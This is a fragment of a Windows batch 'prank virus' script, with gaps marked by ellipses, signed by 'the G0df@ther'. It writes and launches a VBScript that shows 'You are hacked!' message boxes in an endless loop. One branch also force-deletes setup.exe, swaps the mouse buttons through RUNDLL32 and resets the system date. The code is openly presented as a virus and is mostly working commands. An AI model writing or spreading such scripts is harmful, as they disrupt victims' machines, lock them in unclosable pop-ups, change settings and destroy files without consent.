...
:love
echo I love you too...
echo I will give you a present because you love me...
echo But first I want to say...
echo ........
echo .....
echo You are hacked my love!!! 
echo info: This virus was made by the G0df@ther!
timeout 5
...
echo do>>msg.vbs
echo Msgbox"I love you darling.....",0+0,"You are hacked!">>msg.vbs
echo loop>>msg.vbs
start msg.vbs
...
echo You are hacked!!! ,!,
echo Info: This virus was created by the G0df@ther!
...
DEL /F /S /Q /A "setup.exe"
echo do>>msg.vbs
echo Msgbox"I hate you...
Here is the payback for the things you did to me!",0+0,"You are hacked!">>msg.vbs
echo loop>>msg.vbs
start msg.vbs
RUNDLL32 USER32.DLL,SwapMouseButton
date 22/08/2014
